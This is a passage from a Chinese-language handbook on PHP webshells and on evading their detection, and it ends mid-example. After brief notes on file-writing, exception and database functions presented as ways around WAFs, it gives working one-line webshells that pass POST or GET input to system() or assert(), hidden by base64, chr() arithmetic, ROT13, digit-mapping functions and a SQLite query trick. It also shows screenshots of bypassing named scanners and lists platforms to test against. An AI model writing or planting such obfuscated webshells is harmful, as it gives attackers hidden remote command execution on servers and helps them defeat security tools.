<p><strong>fwrite() 函数是用于写入文件，如果成功执行，则返回写入的字节数；失败，则返回 FALSE</strong></p>
<p>Demo：将 <code>Hello World. Testing!</code> 写入 <code>test.txt</code></p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen<span class="token punctuation">(</span></span><span class="token string">"test.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">fwrite<span class="token punctuation">(</span></span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"Hello World. Testing!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true"> //21
</span><span class="token function">fclose<span class="token punctuation">(</span></span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<h3 id="42-file_put_contents">4.2 file_put_contents()</h3>
<p><strong>file_put_contents() 函数把一个字符串写入文件中</strong></p>
<p>如果文件不存在，将创建一个文件</p>
<p>Demo：使用 <code>FILE_APPEND</code> 标记，可以在文件末尾追加内容</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">'sites.txt'</span><span class="token punctuation">;</span>
<span class="token variable">$site</span> <span class="token operator">=</span> <span class="token string">"\nGoogle"</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents<span class="token punctuation">(</span></span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$site</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<p>同时该函数可以配合解密函数写入文件，比如：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$datatest</span> <span class="token operator">=</span> <span class="token string">"[文件的base64编码]"</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents<span class="token punctuation">(</span></span><span class="token string">'./要写入的文件名'</span><span class="token punctuation">,</span> <span class="token function">base64_decode<span class="token punctuation">(</span></span><span class="token variable">$datatest</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<h2 id="5">5 异常处理类函数</h2>
<h3 id="50-tips">5.0 Tips</h3>
<p>在PHP的异常处理中，异常处理的相关函数引起了安全行业人员的注意，可以构造相关的异常处理，来绕过WAF的识别和检测。</p>
<h3 id="51-exception">5.1 Exception 类</h3>
<p><code>Exception</code> 类是php所有异常的基类，这个类包含如下方法：</p>
<pre class="codehilite language-php"><code class=" language-php">__construct <span class="token comment" spellcheck="true"> //异常构造函数
</span>getMessage  <span class="token comment" spellcheck="true"> //获取异常消息内容
</span>getPrevious <span class="token comment" spellcheck="true"> //返回异常链中的前一个异常，如果不存在则返回null值
</span>getCode     <span class="token comment" spellcheck="true"> //获取异常代码
</span>getFile     <span class="token comment" spellcheck="true"> //获取发生异常的程序文件名称
</span>getLine     <span class="token comment" spellcheck="true"> //获取发生异常的代码在文件中的行号
</span>getTrace    <span class="token comment" spellcheck="true"> //获取异常追踪信息，其返回值是一个数组
</span>getTraceAsString<span class="token comment" spellcheck="true"> //获取字符串类型的异常追踪信息</span></code></pre>


<p>写个简单的例子方便理解：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token comment" spellcheck="true">// 创建一个有异常处理的函数
</span><span class="token keyword">function</span> <span class="token function">checkNum<span class="token punctuation">(</span></span><span class="token variable">$number</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token operator">&gt;</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">"变量值必须小于等于 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token comment" spellcheck="true">
// 在 try 块 触发异常
</span><span class="token keyword">try</span>
<span class="token punctuation">{</span>
    <span class="token function">checkNum<span class="token punctuation">(</span></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token comment" spellcheck="true"> // 如果抛出异常，以下文本不会输出
</span>    <span class="token keyword">echo</span> <span class="token string">'如果输出该内容，说明 $number 变量'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token comment" spellcheck="true">
// 捕获异常
</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception <span class="token variable">$e</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">'Message: '</span> <span class="token punctuation">.</span><span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getMessage<span class="token punctuation">(</span></span><span class="token punctuation">)</span> <span class="token punctuation">.</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span></span>" <span class="token punctuation">;</span> 
    <span class="token keyword">echo</span> <span class="token string">"错误信息："</span> <span class="token punctuation">.</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getMessage<span class="token punctuation">(</span></span><span class="token punctuation">)</span> <span class="token punctuation">.</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span></span>"<span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">"错误码："</span> <span class="token punctuation">.</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getCode<span class="token punctuation">(</span></span><span class="token punctuation">)</span> <span class="token punctuation">.</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span></span>"<span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">"错误文件："</span> <span class="token punctuation">.</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getFile<span class="token punctuation">(</span></span><span class="token punctuation">)</span> <span class="token punctuation">.</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span></span>"<span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">"错误行数："</span> <span class="token punctuation">.</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getLine<span class="token punctuation">(</span></span><span class="token punctuation">)</span> <span class="token punctuation">.</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span></span>"<span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">"前一个异常："</span> <span class="token punctuation">.</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getPrevious<span class="token punctuation">(</span></span><span class="token punctuation">)</span> <span class="token punctuation">.</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span></span>"<span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">"异常追踪信息："</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">""</span> <span class="token punctuation">.</span> <span class="token function">print_r<span class="token punctuation">(</span></span><span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getTrace<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span></span>"<span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">"报错内容输出完毕"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>


<p>运行后输出结果：</p>
<pre class="codehilite language-php"><code class=" language-php">Message<span class="token punctuation">:</span> 变量值必须小于等于 <span class="token number">1</span>
错误信息：变量值必须小于等于 <span class="token number">1</span>
错误码：<span class="token number">0</span>
错误文件：D<span class="token punctuation">:</span>\<span class="token package">phpstudy_pro<span class="token punctuation">\</span>WWW<span class="token punctuation">\</span>AabyssZG<span class="token punctuation">\</span>error</span><span class="token punctuation">.</span>php
错误行数：<span class="token number">7</span>
前一个异常：
异常追踪信息：<span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span>file<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> D<span class="token punctuation">:</span>\<span class="token package">phpstudy_pro<span class="token punctuation">\</span>WWW<span class="token punctuation">\</span>AabyssZG<span class="token punctuation">\</span>error</span><span class="token punctuation">.</span>php <span class="token punctuation">[</span>line<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">14</span> <span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> checkNum <span class="token punctuation">[</span>args<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">2</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span>
报错内容输出完毕
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>


<h2 id="6">6 数据库连接函数</h2>
<h3 id="60-tips">6.0 Tips</h3>
<p>可以尝试通过读取数据库内的内容，来获取敏感关键词或者拿到执行命令的关键语句，就可以拼接到php中执行恶意的代码了。</p>
<h3 id="61-sqlite">6.1 Sqlite数据库</h3>
<p>配合我上面写的 <code>file_put_contents()</code> 文件写入函数，先写入本地Sqlite文件然后读取敏感内容</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string">"AabyssZG.db"</span><span class="token punctuation">;</span>
<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string">"sqlite:"</span> <span class="token punctuation">.</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">
//连接数据库后查询敏感关键词
</span><span class="token variable">$sql_stmt</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">prepare<span class="token punctuation">(</span></span><span class="token string">'select * from test where name="system"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql_stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">execute<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">
//提权敏感关键词并进行拼接
</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">substr<span class="token punctuation">(</span></span><span class="token variable">$sql_stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">queryString</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$f</span><span class="token punctuation">(</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string">'aabyss'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true"> //system($_GET['aabyss']);</span></code></pre>


<h3 id="62-mysql">6.2 MySQL数据库</h3>
<p>这里使用 <code>MySQLi()</code> 这个函数，其实PHP有很多MySQL连接函数，可自行尝试</p>
<p>然后通过这个函数，连接公网数据库（只要目标能出网），即可连接并获得敏感字符拼接到php中</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">function</span> <span class="token function">coon<span class="token punctuation">(</span></span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MySQLi</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"test123"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token comment" spellcheck="true"> //默认的 MySQL的类，其属性与方法见手册
</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mysqli</span> <span class="token operator">-</span> <span class="token operator">&gt;</span> connect_error<span class="token punctuation">)</span> <span class="token punctuation">{</span>
       <span class="token comment" spellcheck="true"> //connect_error为属性，报错
</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"数据库连接失败："</span><span class="token punctuation">.</span><span class="token variable">$mysqli</span> <span class="token operator">-</span> <span class="token operator">&gt;</span> connect_errno<span class="token punctuation">.</span> <span class="token string">"--"</span><span class="token punctuation">.</span><span class="token variable">$mysqli</span> <span class="token operator">-</span> <span class="token operator">&gt;</span> connect_error<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token comment" spellcheck="true"> // connect_errno:错误编号
</span>    <span class="token punctuation">}</span>
    <span class="token variable">$mysqli</span> <span class="token operator">-</span> <span class="token operator">&gt;</span> <span class="token function">select_db<span class="token punctuation">(</span></span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"> //选择数据库
</span>   <span class="token comment" spellcheck="true"> // 返回值 $res 为资源类型（获取到结果的资源类型）
</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span> <span class="token operator">-</span> <span class="token operator">&gt;</span> <span class="token function">query<span class="token punctuation">(</span></span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span> <span class="token operator">-</span> <span class="token operator">&gt;</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token comment" spellcheck="true"> //释放结果集，关闭连接
</span>    <span class="token variable">$mysqli</span> <span class="token operator">-</span> <span class="token operator">&gt;</span> <span class="token function">close<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from test where name LIKE 'system'"</span><span class="token punctuation">;</span>
<span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">coon<span class="token punctuation">(</span></span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"data"</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">json_encode<span class="token punctuation">(</span></span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<h2 id="7-php">7 PHP过滤器</h2>
<p><img alt="PHP过滤器.png" src="./PHP 从零学习到 Webshell 免杀手册_files/1696729084000-2otfzh.png-w331s"></p>
<h1 id="webshell">三、Webshell免杀</h1>
<h2 id="_1">学习后的免杀效果</h2>
<p>学习本手册后，可以达到如下效果，当然这只是拿其中的一个简单的例子进行测试的，感兴趣的可以深入学习并自由组合</p>
<h4 id="webshell_1">牧云Webshell检测引擎：</h4>
<p><img alt="CT绕过截图.png" src="./PHP 从零学习到 Webshell 免杀手册_files/1696729084000-3ygcde.png-w331s"></p>
<h4 id="_2">微步在线云沙箱：</h4>
<p><img alt="微步绕过.png" src="./PHP 从零学习到 Webshell 免杀手册_files/1696729084000-4qpcxa.png-w331s"></p>
<p><img alt="微步绕过检测.png" src="./PHP 从零学习到 Webshell 免杀手册_files/1696729084000-5jpsle.png-w331s"></p>
<h4 id="webshell_2">河马WebShell在线查杀：</h4>
<p><img alt="河马绕过.png" src="./PHP 从零学习到 Webshell 免杀手册_files/1696729084000-6jraii.png-w331s"></p>
<h4 id="webdir">百度WEBDIR+在线查杀：</h4>
<p><img alt="百度绕过.png" src="./PHP 从零学习到 Webshell 免杀手册_files/1696729084000-7qxncl.png-w331s"></p>
<h4 id="virustotal">大名鼎鼎的VirusTotal：</h4>
<p><img alt="VT绕过.png" src="./PHP 从零学习到 Webshell 免杀手册_files/1696729085000-8xzwod.png-w331s"></p>
<h2 id="0">0 免杀思路概述</h2>
<p>首先，要知己知彼，才能针对性做出策略来使得WebShell成功免杀</p>
<h3 id="01-webshell">0.1 WebShell查杀思路</h3>
<p>对于WebShell的查杀思路，大致有以下几种：</p>
<ul>
<li>分析统计内容（传统）：可以结合字符黑名单和函数黑名单或者其他特征列表（例如代码片段的Hash特征表），之后通过对文件信息熵、元字符、特殊字符串频率等统计方式发现WebShell。</li>
<li>语义分析（AST）：把代码转换成AST语法树，之后可以对一些函数进行调试追踪，那些混淆或者变形过的webshell基本都能被检测到。但是对于PHP这种动态特性很多的语言，检测就比较吃力，AST是无法了解语义的。</li>
<li>机器学习（AI）：这种方法需要大量的样本数据，通过一些AI自动学习模型，总结归类Webshell的特征库，最终去检测Webshell。</li>
<li>动态监控（沙箱）：采用RASP方式，一旦检测到有对应脚本运行，就去监控（Hook）里边一些危险函数，一但存在调用过程将会立刻阻止。这种阻止效果是实时的，这种方法应该是效果最好的，但是成本十分高昂。</li>
</ul>
<h3 id="02-webshell">0.2 WebShell整体免杀思路</h3>
<p>而对于最常见也是最简单的WebShell，即一句话木马，都是以下形式存在的：</p>
<p><img alt="WebShell基本构造.png" src="./PHP 从零学习到 Webshell 免杀手册_files/1696729085000-9yupay.png-w331s"></p>
<p><strong>而我们要做的是：通过PHP语言的动特性，灵活利用各种PHP函数和特性，混淆和变形中间两部分内容，从而达到免杀</strong></p>
<h3 id="03-webshell">0.3 WebShell免杀注意点</h3>
<h4 id="031-eval">0.3.1 <code>eval()</code> 高危函数</h4>
<p><code>eval()</code> 不能作为函数名动态执行代码，官方说明如下：eval 是一个语言构造器而不是一个函数，不能被可变函数调用</p>
<blockquote>
<p>可变函数：通过一个变量获取其对应的变量值，然后通过给该值增加一个括号 ()，让系统认为该值是一个函数，从而当做函数来执行</p>
</blockquote>
<p>人话：<code>eval()</code> 函数不能通过拼接、混淆来进行执行，只能通过明文直接写入</p>
<h4 id="032-assert">0.3.2 <code>assert()</code> 高危函数</h4>
<p>在PHP7 中，<code>assert ()</code> 也不再是函数了，变成了一个语言结构（类似于 eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点，这个感兴趣可以自行了解即可</p>
<p>所以在WebShell免杀这块，我还是更喜欢用 <code>system()</code> 高危函数，以下很多案例都是使用 <code>system()</code> 来最终执行的</p>
<h3 id="04-webshell">0.4 WebShell免杀测试</h3>
<ul>
<li>渊龙Sec团队导航（上面啥都有）：<a href="https://dh.aabyss.cn/" title=" https://dh.aabyss.cn/"> https://dh.aabyss.cn/</a></li>
<li>长亭牧云查杀： <a href="https://stack.chaitin.com/security-challenge/webshell/index" title="ttps://stack.chaitin.com/security-challenge/webshell/index">https://stack.chaitin.com/security-challenge/webshell/index</a></li>
<li>阿里云恶意文件检测平台：<a href="https://ti.aliyun.com/#/webshell" title="https://ti.aliyun.com/#/webshell">https://ti.aliyun.com/#/webshell</a></li>
<li>阿里伏魔引擎：<a href="https://xz.aliyun.com/zues" title=" https://xz.aliyun.com/zues"> https://xz.aliyun.com/zues</a></li>
<li>VirusTotal： <a href="https://www.virustotal.com/gui/home/upload" title="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a></li>
<li>微步在线云沙箱： <a href="https://s.threatbook.com/" title="https://s.threatbook.com/">https://s.threatbook.com/</a></li>
<li>河马WebShell查杀：<a href="https://n.shellpub.com/" title=" https://n.shellpub.com/"> https://n.shellpub.com/</a></li>
<li>百度WEBDIR+： <a href="https://scanner.baidu.com/" title="https://scanner.baidu.com/">https://scanner.baidu.com/</a></li>
<li>D盾： <a href="http://www.d99net.net/" title="http://www.d99net.net/">http://www.d99net.net/</a></li>
<li>网站安全狗： <a href="http://free.safedog.cn/website_safedog.html" title="http://free.safedog.cn/website_safedog.html">http://free.safedog.cn/website_safedog.html</a></li>
</ul>
<h2 id="1_1">1 编码绕过</h2>
<p>这算是早期的免杀手法，可以通过编码来绕过WAF的检测，如下：</p>
<h3 id="11-base64">1.1 Base64编码</h3>
<pre class="codehilite language-php"><code class=" language-php"><span class="token php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">base64_decode<span class="token punctuation">(</span></span><span class="token string">"YX____Nz__ZX__J0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true"> //解密后为assert高危函数
</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token global">$_POST</span><span class="token punctuation">[</span>aabyss<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment" spellcheck="true"> //assert($_POST[aabyss]);
</span><span class="token delimiter">?&gt;</span></span></code></pre>


<h3 id="12-ascii">1.2 ASCII编码</h3>
<pre class="codehilite language-php"><code class=" language-php"><span class="token php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">
//ASCII编码解密后为assert高危函数
</span><span class="token variable">$f</span> <span class="token operator">=</span>  <span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">98</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">116</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">116</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">103</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">112</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">110</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$f</span><span class="token punctuation">(</span><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'aabyss'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment" spellcheck="true"> //assert($_POST['aabyss']);
</span><span class="token delimiter">?&gt;</span></span></code></pre>


<h3 id="13-rot13">1.3 ROT13编码</h3>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">str_rot13<span class="token punctuation">(</span></span><span class="token string">'flfgrz'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true"> //解密后为system高危函数
</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'aabyss'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true"> //system($_POST['aabyss']);</span></code></pre>


<p>当然还有很多其他的编码和加密方式，但常见的编码方式都被放入敏感名单了，会根据加密的形式自动进行解密</p>
<p>可以考虑一些比较冷门的编码方式，或者写一个类似于凯撒密码的加密函数，来对WAF进行ByPass</p>
<h3 id="14-gzip">1.4 Gzip压缩加密</h3>
<p>我先举一个 <code>phpinfo()</code> 加密后的示例：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token comment" spellcheck="true">/*Protected by AabyssZG*/</span>
<span class="token function">eval<span class="token punctuation">(</span></span><span class="token function">gzinflate<span class="token punctuation">(</span></span><span class="token function">base64_decode<span class="token punctuation">(</span></span><span class="token string">'40pNzshXKMgoyMxLy9fQtFawtwMA'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre>


<p>加密手法可以看我写的博客： <a href="https://blog.zgsec.cn/index.php/archives/147/" title="https://blog.zgsec.cn/index.php/archives/147/">https://blog.zgsec.cn/index.php/archives/147/</a></p>
<h2 id="2_1">2 字符串混淆处理绕过</h2>
<h3 id="21">2.1 自定义函数混淆字符串</h3>
<p>通过对上面所说两部分敏感内容的拼接、混淆以及变换，来绕过WAF的检测逻辑，如下：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">function</span> <span class="token function">confusion<span class="token punctuation">(</span></span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">&gt;</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$tmp</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token operator">/</span><span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token variable">$tmp</span><span class="token punctuation">.</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">confusion<span class="token punctuation">(</span></span><span class="token number">976534</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true"> //sysTem（高危函数）
</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'aabyss'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true"> //sysTem($_POST['aabyss']);</span></code></pre>


<h3 id="22">2.2 自定义函数+文件名混淆</h3>
<p>同，可以配合文件名玩出一些花活，我们建一个PHP名字为 <code>976534.php</code>：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">function</span> <span class="token function">confusion<span class="token punctuation">(</span></span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">,</span><span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">&gt;</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$tmp</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token operator">/</span><span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token variable">$tmp</span><span class="token punctuation">.</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">confusion<span class="token punctuation">(</span></span><span class="token function">intval<span class="token punctuation">(</span></span><span class="token function">substr<span class="token punctuation">(</span></span><span class="token constant">__FILE__</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true"> //sysTem（高危函数）
